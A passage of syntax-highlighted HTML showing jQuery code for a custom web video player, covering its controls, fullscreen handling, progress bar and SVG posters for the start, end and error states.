                    <span class="o">$</span><span class="p">(</span><span class="n">errorPoster</span><span class="p">)</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;height&quot;</span><span class="p">,</span> <span class="o">$</span><span class="p">(</span><span class="n">video</span><span class="p">)</span><span class="o">.</span><span class="n">height</span><span class="p">());</span>
                    <span class="o">$</span><span class="p">(</span><span class="n">errorPoster</span><span class="p">)</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;width&quot;</span><span class="p">,</span> <span class="o">$</span><span class="p">(</span><span class="n">video</span><span class="p">)</span><span class="o">.</span><span class="n">width</span><span class="p">());</span>

                    <span class="o">$</span><span class="p">(</span><span class="s2">&quot;source&quot;</span><span class="p">,</span> <span class="o">$</span><span class="p">(</span><span class="n">video</span><span class="p">))</span><span class="o">.</span><span class="n">each</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
                        <span class="k">var</span> <span class="n">newText</span> <span class="o">=</span> <span class="n">doc</span><span class="o">.</span><span class="n">createElementNS</span><span class="p">(</span><span class="s2">&quot;http://www.w3.org/2000/svg&quot;</span><span class="p">,</span> <span class="s2">&quot;tspan&quot;</span><span class="p">);</span>
                        <span class="k">var</span> <span class="n">link</span> <span class="o">=</span> <span class="n">doc</span><span class="o">.</span><span class="n">createElementNS</span><span class="p">(</span><span class="s2">&quot;http://www.w3.org/2000/svg&quot;</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">);</span>
                        <span class="n">newText</span><span class="o">.</span><span class="n">setAttributeNS</span><span class="p">(</span><span class="nb nb-Type">null</span><span class="p">,</span> <span class="s2">&quot;x&quot;</span><span class="p">,</span> <span class="s2">&quot;50%&quot;</span><span class="p">);</span>
                        <span class="n">newText</span><span class="o">.</span><span class="n">setAttributeNS</span><span class="p">(</span><span class="nb nb-Type">null</span><span class="p">,</span> <span class="s2">&quot;dy&quot;</span><span class="p">,</span> <span class="s2">&quot;1.2em&quot;</span><span class="p">);</span>
                        <span class="n">link</span><span class="o">.</span><span class="n">setAttributeNS</span><span class="p">(</span><span class="s2">&quot;http://www.w3.org/1999/xlink&quot;</span><span class="p">,</span> <span class="s2">&quot;href&quot;</span><span class="p">,</span> <span class="n">this</span><span class="o">.</span><span class="n">src</span><span class="p">);</span>
                        <span class="n">link</span><span class="o">.</span><span class="n">appendChild</span><span class="p">(</span><span class="n">doc</span><span class="o">.</span><span class="n">createTextNode</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">src</span><span class="p">));</span>
                        <span class="n">newText</span><span class="o">.</span><span class="n">appendChild</span><span class="p">(</span><span class="n">link</span><span class="p">);</span>

                        <span class="o">$</span><span class="p">(</span><span class="s2">&quot;#sorrytext&quot;</span><span class="p">,</span> <span class="n">errorPoster</span><span class="p">)</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">newText</span><span class="p">);</span>
                    <span class="p">});</span>

                    <span class="o">$</span><span class="n">videoContainer</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">errorPoster</span><span class="p">);</span>
                    <span class="o">$</span><span class="p">(</span><span class="o">$</span><span class="n">videoContainer</span><span class="p">)</span><span class="o">.</span><span class="n">trigger</span><span class="p">(</span><span class="s2">&quot;reposition&quot;</span><span class="p">);</span>
                <span class="p">});</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="o">$</span><span class="p">(</span><span class="o">$</span><span class="n">currentTimeSpan</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">(</span><span class="n">rawTimeToFormattedTime</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">currentTime</span><span class="p">));</span>
                <span class="o">$</span><span class="p">(</span><span class="o">$</span><span class="n">durationTimeSpan</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">(</span><span class="n">rawTimeToFormattedTime</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">duration</span><span class="p">));</span>
            <span class="p">}</span>

        <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;click&quot;</span><span class="p">,</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="n">playPause</span><span class="p">(</span><span class="n">video</span><span class="p">);</span>
        <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;ended&quot;</span><span class="p">,</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="o">$</span><span class="n">controlsBox</span><span class="o">.</span><span class="n">css</span><span class="p">({</span><span class="s1">&#39;opacity&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">});</span>

            <span class="o">//</span> <span class="n">Poster</span> <span class="n">to</span> <span class="n">show</span> <span class="n">at</span> <span class="n">end</span> <span class="n">of</span> <span class="n">movie</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">video</span><span class="o">.</span><span class="n">dataset</span><span class="o">.</span><span class="n">endposter</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">customEndPoster</span> <span class="o">=</span> <span class="n">video</span><span class="o">.</span><span class="n">dataset</span><span class="o">.</span><span class="n">endposter</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="n">customEndPoster</span> <span class="o">=</span> <span class="s2">&quot;/media/site-images/endofmovie.svg&quot;</span><span class="p">;</span>  <span class="o">//</span> <span class="n">If</span> <span class="n">none</span> <span class="n">supplied</span><span class="p">,</span> <span class="n">use</span> <span class="n">our</span> <span class="n">own</span><span class="p">,</span> <span class="n">generic</span> <span class="n">one</span>
            <span class="p">}</span>
            <span class="o">//</span> <span class="n">Get</span> <span class="n">the</span> <span class="n">poster</span> <span class="ow">and</span> <span class="n">make</span> <span class="n">it</span> <span class="n">inline</span>
            <span class="o">//</span> <span class="n">File</span> <span class="k">is</span> <span class="n">SVG</span> <span class="n">so</span> <span class="n">usual</span> <span class="n">jQuery</span> <span class="n">rules</span> <span class="n">may</span> <span class="ow">not</span> <span class="n">apply</span>
            <span class="o">//</span> <span class="n">File</span> <span class="n">needs</span> <span class="n">to</span> <span class="n">have</span> <span class="n">at</span> <span class="n">least</span> <span class="n">one</span> <span class="n">element</span> <span class="n">with</span> <span class="s2">&quot;playButton&quot;</span> <span class="k">as</span> <span class="k">class</span>
            <span class="o">$.</span><span class="n">get</span><span class="p">(</span><span class="n">customEndPoster</span><span class="p">,</span> <span class="n">function</span> <span class="p">(</span><span class="n">svg</span><span class="p">)</span> <span class="p">{</span>
                <span class="o">$</span><span class="n">endPoster</span> <span class="o">=</span> <span class="n">doc</span><span class="o">.</span><span class="n">importNode</span><span class="p">(</span><span class="n">svg</span><span class="o">.</span><span class="n">documentElement</span><span class="p">,</span> <span class="bp">true</span><span class="p">);</span>
                <span class="o">$</span><span class="n">endPoster</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="o">$</span><span class="n">endPoster</span><span class="p">);</span>

                <span class="o">$</span><span class="n">endPoster</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;class&quot;</span><span class="p">,</span> <span class="s2">&quot;poster endposter&quot;</span><span class="p">);</span>
                <span class="o">$</span><span class="n">endPoster</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;height&quot;</span><span class="p">,</span> <span class="o">$</span><span class="p">(</span><span class="n">video</span><span class="p">)</span><span class="o">.</span><span class="n">height</span><span class="p">());</span>
                <span class="o">$</span><span class="n">endPoster</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;width&quot;</span><span class="p">,</span> <span class="o">$</span><span class="p">(</span><span class="n">video</span><span class="p">)</span><span class="o">.</span><span class="n">width</span><span class="p">());</span>

                <span class="o">$</span><span class="p">(</span><span class="s2">&quot;#playButton&quot;</span><span class="p">,</span> <span class="o">$</span><span class="n">endPoster</span><span class="p">)</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;click&quot;</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
                    <span class="n">playPause</span><span class="p">(</span><span class="n">video</span><span class="p">);</span>
                    <span class="o">$</span><span class="n">endPoster</span><span class="o">.</span><span class="n">remove</span><span class="p">();</span> <span class="o">//</span> <span class="n">done</span> <span class="n">with</span> <span class="n">poster</span> <span class="n">forever</span>
                <span class="p">});</span>
                <span class="o">$</span><span class="n">videoContainer</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="o">$</span><span class="n">endPoster</span><span class="p">);</span>
                <span class="o">$</span><span class="p">(</span><span class="o">$</span><span class="n">videoContainer</span><span class="p">)</span><span class="o">.</span><span class="n">trigger</span><span class="p">(</span><span class="s2">&quot;reposition&quot;</span><span class="p">);</span>
            <span class="p">});</span>
        <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;play&quot;</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>

        <span class="p">});</span>

    <span class="o">//</span> <span class="n">Setup</span> <span class="n">the</span> <span class="n">div</span> <span class="n">container</span> <span class="k">for</span> <span class="n">the</span> <span class="n">video</span><span class="p">,</span> <span class="n">controls</span> <span class="ow">and</span> <span class="n">poster</span>
    <span class="o">$</span><span class="n">videoContainer</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="n">video</span><span class="p">)</span><span class="o">.</span><span class="n">wrap</span><span class="p">(</span>
        <span class="o">$</span><span class="p">(</span><span class="s1">&#39;&lt;div&gt;&lt;/div&gt;&#39;</span><span class="p">,</span> <span class="p">{</span>
            <span class="k">class</span><span class="p">:</span> <span class="s1">&#39;videoContainer&#39;</span>
        <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;mouseenter&quot;</span><span class="p">,</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
                <span class="o">$</span><span class="n">endPoster</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="s2">&quot;.endposter&quot;</span><span class="p">,</span> <span class="n">this</span><span class="p">);</span> <span class="o">//</span> <span class="n">This</span> <span class="k">is</span> <span class="n">NOT</span> <span class="n">added</span> <span class="n">to</span> <span class="n">the</span> <span class="n">whole</span> <span class="n">script</span> <span class="n">scope</span> <span class="n">so</span> <span class="n">have</span> <span class="n">to</span> <span class="n">rescope</span> <span class="n">it</span> <span class="n">here</span>
                <span class="n">errorPoster</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="s2">&quot;.errorposter&quot;</span><span class="p">,</span> <span class="n">this</span><span class="p">);</span> <span class="o">//</span> <span class="n">This</span> <span class="k">is</span> <span class="n">NOT</span> <span class="n">added</span> <span class="n">to</span> <span class="n">the</span> <span class="n">whole</span> <span class="n">script</span> <span class="n">scope</span> <span class="n">so</span> <span class="n">have</span> <span class="n">to</span> <span class="n">rescope</span> <span class="n">it</span> <span class="n">here</span>
                <span class="o">//</span>   <span class="n">Not</span> <span class="n">played</span> <span class="n">yet</span>              <span class="n">Finished</span> <span class="n">playing</span>              <span class="n">Cant</span> <span class="n">play</span> <span class="n">format</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">$</span><span class="n">startPoster</span><span class="o">.</span><span class="n">parent</span><span class="p">()</span><span class="o">.</span><span class="n">length</span> <span class="o">||</span> <span class="o">$</span><span class="n">endPoster</span><span class="o">.</span><span class="n">parent</span><span class="p">()</span><span class="o">.</span><span class="n">length</span> <span class="o">||</span> <span class="n">errorPoster</span><span class="o">.</span><span class="n">parent</span><span class="p">()</span><span class="o">.</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span>
                    <span class="o">$</span><span class="n">controlsBox</span><span class="o">.</span><span class="n">css</span><span class="p">({</span><span class="s1">&#39;opacity&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">});</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="o">$</span><span class="n">controlsBox</span><span class="o">.</span><span class="n">fadeTo</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
                    <span class="o">$</span><span class="n">controlsBox</span><span class="o">.</span><span class="n">clearQueue</span><span class="p">();</span>
                <span class="p">}</span>
            <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;mouseleave&quot;</span><span class="p">,</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
                <span class="o">$</span><span class="n">controlsBox</span><span class="o">.</span><span class="n">fadeTo</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
                <span class="o">$</span><span class="n">controlsBox</span><span class="o">.</span><span class="n">clearQueue</span><span class="p">();</span>
            <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;reposition&quot;</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
                <span class="o">//</span> <span class="n">Move</span> <span class="n">posters</span> <span class="ow">and</span> <span class="n">controls</span> <span class="n">back</span> <span class="n">into</span> <span class="n">position</span> <span class="n">after</span> <span class="n">video</span> <span class="n">position</span> <span class="n">updated</span>
                <span class="k">var</span> <span class="n">videoContainerOffset</span> <span class="o">=</span> <span class="o">$</span><span class="n">videoContainer</span><span class="o">.</span><span class="n">offset</span><span class="p">(),</span>
                    <span class="n">videoContainerWidth</span> <span class="o">=</span> <span class="o">$</span><span class="n">videoContainer</span><span class="o">.</span><span class="n">width</span><span class="p">(),</span>
                    <span class="n">heightsTogether</span> <span class="o">=</span> <span class="n">Math</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="n">videoContainerOffset</span><span class="o">.</span><span class="n">top</span> <span class="o">+</span> <span class="o">$</span><span class="n">videoContainer</span><span class="o">.</span><span class="n">height</span><span class="p">()</span> <span class="o">-</span> <span class="o">$</span><span class="n">controlsBox</span><span class="o">.</span><span class="n">height</span><span class="p">()),</span>
                    <span class="o">$</span><span class="n">endPoster</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="s2">&quot;.endposter&quot;</span><span class="p">,</span> <span class="n">this</span><span class="p">),</span>
                    <span class="o">$</span><span class="n">errorPoster</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="s2">&quot;.errorposter&quot;</span><span class="p">,</span> <span class="n">this</span><span class="p">);</span>

                <span class="o">$</span><span class="p">(</span><span class="o">$</span><span class="n">startPoster</span><span class="p">,</span> <span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">offset</span><span class="p">({</span><span class="n">top</span><span class="p">:</span> <span class="n">videoContainerOffset</span><span class="o">.</span><span class="n">top</span><span class="p">,</span> <span class="n">left</span><span class="p">:</span> <span class="n">videoContainerOffset</span><span class="o">.</span><span class="n">left</span><span class="p">});</span>

                <span class="o">$</span><span class="n">endPoster</span><span class="o">.</span><span class="n">offset</span><span class="p">({</span><span class="n">top</span><span class="p">:</span> <span class="n">videoContainerOffset</span><span class="o">.</span><span class="n">top</span><span class="p">,</span> <span class="n">left</span><span class="p">:</span> <span class="n">videoContainerOffset</span><span class="o">.</span><span class="n">left</span><span class="p">});</span>
                <span class="o">$</span><span class="n">endPoster</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;height&quot;</span><span class="p">,</span> <span class="o">$</span><span class="p">(</span><span class="n">video</span><span class="p">)</span><span class="o">.</span><span class="n">height</span><span class="p">());</span>
                <span class="o">$</span><span class="n">endPoster</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;width&quot;</span><span class="p">,</span> <span class="o">$</span><span class="p">(</span><span class="n">video</span><span class="p">)</span><span class="o">.</span><span class="n">width</span><span class="p">());</span>

                <span class="o">$</span><span class="n">errorPoster</span><span class="o">.</span><span class="n">offset</span><span class="p">({</span><span class="n">top</span><span class="p">:</span> <span class="n">videoContainerOffset</span><span class="o">.</span><span class="n">top</span><span class="p">,</span> <span class="n">left</span><span class="p">:</span> <span class="n">videoContainerOffset</span><span class="o">.</span><span class="n">left</span><span class="p">});</span>

                <span class="o">$</span><span class="n">controlsBox</span><span class="o">.</span><span class="n">offset</span><span class="p">({</span><span class="n">top</span><span class="p">:</span> <span class="n">heightsTogether</span><span class="p">,</span> <span class="n">left</span><span class="p">:</span> <span class="n">videoContainerOffset</span><span class="o">.</span><span class="n">left</span><span class="p">});</span>
                <span class="o">$</span><span class="n">controlsBox</span><span class="o">.</span><span class="n">width</span><span class="p">(</span><span class="n">videoContainerWidth</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span> <span class="o">//</span> <span class="mi">2</span> <span class="k">is</span> <span class="k">for</span> <span class="n">borders</span>
            <span class="p">})</span>
    <span class="p">)</span><span class="o">.</span><span class="n">parent</span><span class="p">();</span> <span class="o">//</span> <span class="n">Return</span> <span class="n">the</span> <span class="n">newly</span> <span class="n">created</span> <span class="n">wrapper</span> <span class="n">div</span> <span class="p">(</span><span class="n">brand</span> <span class="n">new</span> <span class="n">parent</span> <span class="n">of</span> <span class="n">the</span> <span class="n">video</span><span class="p">)</span>

    <span class="o">$</span><span class="n">controlsBox</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="s2">&quot;&lt;div&gt;&lt;/div&gt;&quot;</span><span class="p">,</span> <span class="p">{</span>
        <span class="k">class</span><span class="p">:</span> <span class="s2">&quot;videoControls&quot;</span><span class="p">,</span>
        <span class="n">css</span><span class="p">:</span> <span class="p">{</span>
            <span class="n">opacity</span><span class="p">:</span> <span class="mi">0</span>
        <span class="p">}</span>
    <span class="p">})</span><span class="o">.</span><span class="n">appendTo</span><span class="p">(</span><span class="o">$</span><span class="n">videoContainer</span><span class="p">);</span>

    <span class="o">//</span> <span class="n">Setup</span> <span class="n">play</span><span class="o">/</span><span class="n">pause</span> <span class="n">button</span>
    <span class="o">$</span><span class="n">playPauseButton</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="s2">&quot;&lt;img /&gt;&quot;</span><span class="p">,</span> <span class="p">{</span>
        <span class="k">class</span><span class="p">:</span> <span class="s2">&quot;playPauseButton&quot;</span><span class="p">,</span>
        <span class="n">src</span><span class="p">:</span> <span class="s2">&quot;/media/site-images/videoicons/smallplay.svg&quot;</span>
    <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;click&quot;</span><span class="p">,</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="n">playPause</span><span class="p">(</span><span class="n">video</span><span class="p">);</span>
        <span class="p">})</span><span class="o">.</span><span class="n">appendTo</span><span class="p">(</span><span class="o">$</span><span class="n">controlsBox</span><span class="p">);</span>

    <span class="o">$</span><span class="n">durationTimeSpan</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="s2">&quot;&lt;span&gt;&lt;/span&gt;&quot;</span><span class="p">,</span> <span class="p">{</span>
        <span class="k">class</span><span class="p">:</span> <span class="s2">&quot;timespan&quot;</span>
    <span class="p">})</span><span class="o">.</span><span class="n">appendTo</span><span class="p">(</span><span class="o">$</span><span class="n">controlsBox</span><span class="p">);</span>

    <span class="o">//</span> <span class="n">Setup</span> <span class="n">progress</span> <span class="n">bar</span>
    <span class="o">$</span><span class="n">progressBar</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="s2">&quot;&lt;input /&gt;&quot;</span><span class="p">,</span> <span class="p">{</span>
        <span class="n">type</span><span class="p">:</span> <span class="s2">&quot;range&quot;</span><span class="p">,</span>
        <span class="nb">min</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
        <span class="nb">max</span><span class="p">:</span> <span class="mi">1000</span><span class="p">,</span>
        <span class="n">value</span><span class="p">:</span> <span class="mi">0</span>
    <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;change&quot;</span><span class="p">,</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="n">video</span><span class="o">.</span><span class="n">currentTime</span> <span class="o">=</span> <span class="n">video</span><span class="o">.</span><span class="n">duration</span> <span class="o">*</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">value</span> <span class="o">/</span> <span class="mi">1000</span><span class="p">);</span>
        <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;mousedown&quot;</span><span class="p">,</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="n">video</span><span class="o">.</span><span class="n">pause</span><span class="p">();</span>
        <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;mouseup&quot;</span><span class="p">,</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="n">video</span><span class="o">.</span><span class="n">play</span><span class="p">();</span>
        <span class="p">})</span><span class="o">.</span><span class="n">appendTo</span><span class="p">(</span><span class="o">$</span><span class="n">controlsBox</span><span class="p">);</span>

    <span class="o">$</span><span class="n">currentTimeSpan</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="s2">&quot;&lt;span&gt;&lt;/span&gt;&quot;</span><span class="p">,</span> <span class="p">{</span>
        <span class="k">class</span><span class="p">:</span> <span class="s2">&quot;timespan currenttimespan&quot;</span>
    <span class="p">})</span><span class="o">.</span><span class="n">appendTo</span><span class="p">(</span><span class="o">$</span><span class="n">controlsBox</span><span class="p">);</span>

    <span class="o">//</span> <span class="n">Full</span> <span class="n">screen</span>
    <span class="o">$</span><span class="p">(</span><span class="s2">&quot;&lt;img /&gt;&quot;</span><span class="p">,</span> <span class="p">{</span>
        <span class="k">class</span><span class="p">:</span> <span class="s2">&quot;fullscreenButton&quot;</span><span class="p">,</span>
        <span class="n">src</span><span class="p">:</span> <span class="s2">&quot;/media/site-images/videoicons/fullscreen.svg&quot;</span>
    <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;click&quot;</span><span class="p">,</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="n">fsElement</span> <span class="o">=</span> <span class="n">video</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">video</span><span class="o">.</span><span class="n">requestFullScreen</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">video</span><span class="o">.</span><span class="n">requestFullScreen</span><span class="p">();</span>
            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">video</span><span class="o">.</span><span class="n">webkitRequestFullScreen</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">video</span><span class="o">.</span><span class="n">webkitRequestFullScreen</span><span class="p">();</span>
            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">video</span><span class="o">.</span><span class="n">mozRequestFullScreen</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">video</span><span class="o">.</span><span class="n">mozRequestFullScreen</span><span class="p">();</span>
            <span class="p">}</span>
        <span class="p">})</span><span class="o">.</span><span class="n">appendTo</span><span class="p">(</span><span class="o">$</span><span class="n">controlsBox</span><span class="p">);</span>

    <span class="o">//</span> <span class="n">Posters</span> <span class="n">to</span> <span class="n">show</span> <span class="n">before</span> <span class="n">the</span> <span class="n">user</span> <span class="n">plays</span> <span class="n">the</span> <span class="n">video</span>
    <span class="n">startPoster</span> <span class="o">=</span> <span class="n">this</span><span class="o">.</span><span class="n">dataset</span><span class="o">.</span><span class="n">startposter</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">startPoster</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">startPoster</span> <span class="o">=</span> <span class="s2">&quot;generic&quot;</span><span class="p">;</span>  <span class="o">//</span> <span class="n">If</span> <span class="n">none</span> <span class="n">supplied</span><span class="p">,</span> <span class="n">use</span> <span class="n">our</span> <span class="n">own</span><span class="p">,</span> <span class="n">generic</span> <span class="n">one</span>
    <span class="p">}</span>
    <span class="o">//</span> <span class="n">Get</span> <span class="n">the</span> <span class="n">poster</span> <span class="ow">and</span> <span class="n">make</span> <span class="n">it</span> <span class="n">inline</span>
    <span class="o">//</span> <span class="n">File</span> <span class="k">is</span> <span class="n">SVG</span> <span class="n">so</span> <span class="n">usual</span> <span class="n">jQuery</span> <span class="n">rules</span> <span class="n">may</span> <span class="ow">not</span> <span class="n">apply</span>
    <span class="o">//</span> <span class="n">File</span> <span class="n">needs</span> <span class="n">to</span> <span class="n">have</span> <span class="n">at</span> <span class="n">least</span> <span class="n">one</span> <span class="n">element</span> <span class="n">with</span> <span class="s2">&quot;playButton&quot;</span> <span class="k">as</span> <span class="k">class</span>
    <span class="o">$.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;https://assets.themetacity.com/video/&quot;</span> <span class="o">+</span> <span class="n">startPoster</span> <span class="o">+</span> <span class="s2">&quot;.startposter.svg&quot;</span><span class="p">,</span> <span class="n">function</span> <span class="p">(</span><span class="n">svg</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">$</span><span class="n">startPoster</span> <span class="o">=</span> <span class="n">doc</span><span class="o">.</span><span class="n">importNode</span><span class="p">(</span><span class="n">svg</span><span class="o">.</span><span class="n">documentElement</span><span class="p">,</span> <span class="bp">true</span><span class="p">);</span>
        <span class="o">$</span><span class="n">startPoster</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="o">$</span><span class="n">startPoster</span><span class="p">);</span>

        <span class="o">$</span><span class="n">startPoster</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;class&quot;</span><span class="p">,</span> <span class="s2">&quot;poster&quot;</span><span class="p">);</span>
        <span class="o">$</span><span class="n">startPoster</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;height&quot;</span><span class="p">,</span> <span class="o">$</span><span class="p">(</span><span class="n">video</span><span class="p">)</span><span class="o">.</span><span class="n">height</span><span class="p">());</span>
        <span class="o">$</span><span class="n">startPoster</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;width&quot;</span><span class="p">,</span> <span class="o">$</span><span class="p">(</span><span class="n">video</span><span class="p">)</span><span class="o">.</span><span class="n">width</span><span class="p">());</span>

        <span class="o">$</span><span class="p">(</span><span class="s2">&quot;#playButton&quot;</span><span class="p">,</span> <span class="o">$</span><span class="n">startPoster</span><span class="p">)</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;click&quot;</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="n">video</span><span class="o">.</span><span class="n">load</span><span class="p">();</span>   <span class="o">//</span> <span class="n">Initial</span> <span class="n">data</span> <span class="ow">and</span> <span class="n">metadata</span> <span class="nb">load</span> <span class="n">events</span> <span class="n">may</span> <span class="n">have</span> <span class="n">fired</span> <span class="n">before</span> <span class="n">they</span> <span class="n">can</span> <span class="n">be</span> <span class="n">captured</span> <span class="n">so</span> <span class="n">manually</span> <span class="n">fire</span> <span class="n">them</span>
            <span class="n">playPause</span><span class="p">(</span><span class="n">video</span><span class="p">);</span>
            <span class="o">$</span><span class="n">startPoster</span><span class="o">.</span><span class="n">remove</span><span class="p">();</span> <span class="o">//</span> <span class="n">done</span> <span class="n">with</span> <span class="n">poster</span> <span class="n">forever</span>
        <span class="p">});</span>
        <span class="o">$</span><span class="n">videoContainer</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="o">$</span><span class="n">startPoster</span><span class="p">);</span>
        <span class="o">$</span><span class="p">(</span><span class="o">$</span><span class="n">videoContainer</span><span class="p">)</span><span class="o">.</span><span class="n">trigger</span><span class="p">(</span><span class="s2">&quot;reposition&quot;</span><span class="p">);</span>
    <span class="p">});</span>

    <span class="o">//</span> <span class="n">Add</span> <span class="n">whe</span> <span class="n">whole</span> <span class="n">lot</span> <span class="n">onto</span> <span class="n">the</span> <span class="n">page</span>
    <span class="o">$</span><span class="n">videoContainer</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="o">$</span><span class="n">controlsBox</span><span class="p">);</span>

    <span class="o">$</span><span class="p">(</span><span class="o">$</span><span class="n">videoContainer</span><span class="p">)</span><span class="o">.</span><span class="n">trigger</span><span class="p">(</span><span class="s2">&quot;reposition&quot;</span><span class="p">);</span> <span class="o">//</span><span class="n">Get</span> <span class="n">its</span> <span class="n">position</span> <span class="n">right</span><span class="o">.</span>
<span class="p">});</span>

<span class="o">//</span> <span class="n">Handle</span> <span class="n">coming</span> <span class="n">out</span> <span class="n">of</span> <span class="n">fullscreen</span>
<span class="o">$</span><span class="p">(</span><span class="n">doc</span><span class="p">)</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;webkitfullscreenchange mozfullscreenchange fullscreenchange&quot;</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="k">var</span> <span class="n">isFullScreen</span> <span class="o">=</span> <span class="n">doc</span><span class="o">.</span><span class="n">fullScreen</span> <span class="o">||</span> <span class="n">doc</span><span class="o">.</span><span class="n">mozFullScreen</span> <span class="o">||</span> <span class="n">doc</span><span class="o">.</span><span class="n">webkitIsFullScreen</span><span class="p">;</span>

    <span class="o">$</span><span class="p">(</span><span class="n">fsElement</span><span class="p">)</span><span class="o">.</span><span class="n">each</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>  <span class="o">//</span> <span class="n">set</span> <span class="n">to</span> <span class="n">script</span> <span class="n">scope</span> <span class="k">as</span> <span class="n">fullScreenElement</span> <span class="n">appears</span> <span class="n">to</span> <span class="ow">not</span> <span class="n">work</span> <span class="p">(</span><span class="n">yet</span><span class="err">?</span><span class="p">)</span>
